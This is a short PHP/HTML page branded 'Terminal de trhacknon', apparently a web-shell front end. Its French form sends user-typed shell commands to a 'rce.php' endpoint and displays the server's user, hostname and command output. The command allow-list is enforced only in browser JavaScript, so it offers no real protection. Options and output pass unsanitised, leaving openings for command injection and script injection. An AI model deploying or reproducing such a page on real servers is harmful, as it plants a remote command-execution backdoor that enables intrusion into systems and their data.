<?php
$host = gethostname();
$user = get_current_user();
?>
<!DOCTYPE html>
<html>
<head>
	<title>Formulaire de commande</title>
	<style>
		body {
			background-color: black;
			color: red;
			font-family: monospace;
		}
		.container {
			display: flex;
			flex-direction: column;
			align-items: center;
			margin-top: 100px;
		}
		input[type=text] {
			padding: 10px;
			margin: 10px;
			border-radius: 5px;
			border: none;
			font-size: 18px;
		}
		button {
			padding: 10px 20px;
			border-radius: 5px;
			border: none;
			background-color: red;
			color: white;
			font-size: 18px;
			cursor: pointer;
		}
		.output {
			margin-top: 50px;
			padding: 20px;
			border-radius: 10px;
			background-color: #222;
			border: 2px solid red;
			white-space: pre-wrap;
			word-wrap: break-word;
			max-width: 800px;
		}
		.hidden {
			display: none;
		}
	</style>
</head>
<body><center><div class="header">Terminal de trhacknon - <?php echo $user.'@'.$host; ?></div></center>
	<div class="container">
		<h1>Formulaire de commande</h1>
		<p>Commandes autorisées : ls, id, whoami</p>
		<p>Commandes interdites : rm, mv, cat</p>
		<input type="text" id="commande" placeholder="Commande">
		<input type="text" id="options" placeholder="Options">
		<button onclick="executerCommande()">Exécuter</button>
		<div id="output" class="output hidden"></div>
	</div>
	<script>
		function executerCommande() {
			// Récupération de la commande et des options
			var commande = document.getElementById("commande").value;
			var options = document.getElementById("options").value;
			
			// Vérification de la commande autorisée
			var allowedCommands = ["ls", "id", "whoami", "uname", "pwd"];
			if (allowedCommands.indexOf(commande) === -1) {
				alert("Commande non autorisée par Trhacknon !");
				return;
			}
			
			// Vérification des options
			if (options.indexOf("-") !== 0) {
				options = "";
			}
			
			// Exécution de la commande avec Ajax
			var xhr = new XMLHttpRequest();
			xhr.onreadystatechange = function() {
				if (this.readyState == 4 && this.status == 200) {
					// Affichage de la réponse
					var output = document.getElementById("output");
					output.innerHTML = "hostname, host  : " + this.responseText;
					output.classList.remove("hidden");
				}
			};
			xhr.open("GET", "rce.php?cmd=" + commande + "&options=" + options, true);
			xhr.send();
		}
	</script>
</body>
</html>
